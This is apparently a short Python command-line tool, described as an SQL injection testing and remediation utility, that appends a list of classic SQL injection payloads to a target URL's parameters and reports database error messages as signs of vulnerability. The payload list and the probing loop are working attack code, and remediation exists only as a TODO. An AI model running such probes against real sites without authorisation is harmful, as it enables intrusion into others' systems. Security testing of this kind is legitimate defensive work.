import argparse
import requests
import urllib.parse

# Common SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1-- ",
    '" OR 1=1-- ',
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR ''='",
    '" OR ""="',
    "'--",
    '"--',
]

def test_sqli(url, params, method="GET"):
    print("\n[+] Starting SQL Injection tests...")
    vulnerable = False
    for payload in SQLI_PAYLOADS:
        test_params = {}
        for pair in params.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                test_params[k] = v + payload
        try:
            if method.upper() == "POST":
                resp = requests.post(url, data=test_params, timeout=5)
            else:
                resp = requests.get(url, params=test_params, timeout=5)
            if is_sqli_response(resp.text):
                print(f"[!] Possible SQLi vulnerability with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")
    if not vulnerable:
        print("[-] No SQL injection vulnerabilities detected with basic payloads.")

def is_sqli_response(response_text):
    # Basic error-based detection (can be expanded)
    errors = [
        'You have an error in your SQL syntax',
        'Warning: mysql_',
        'Unclosed quotation mark',
        'quoted string not properly terminated',
        'SQLSTATE',
    ]
    for error in errors:
        if error.lower() in response_text.lower():
            return True
    return False

def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Testing and Remediation CLI Tool"
    )
    parser.add_argument('--url', type=str, help='Target URL to test', required=True)
    parser.add_argument('--params', type=str, help='Parameters to test (e.g., "id=1")', required=True)
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], default='GET', help='HTTP method to use (GET or POST)')
    args = parser.parse_args()

    print(f"Testing {args.url} with params: {args.params} using {args.method} method")
    test_sqli(args.url, args.params, args.method)
    # TODO: Report findings and suggest remediation

if __name__ == "__main__":
    main()
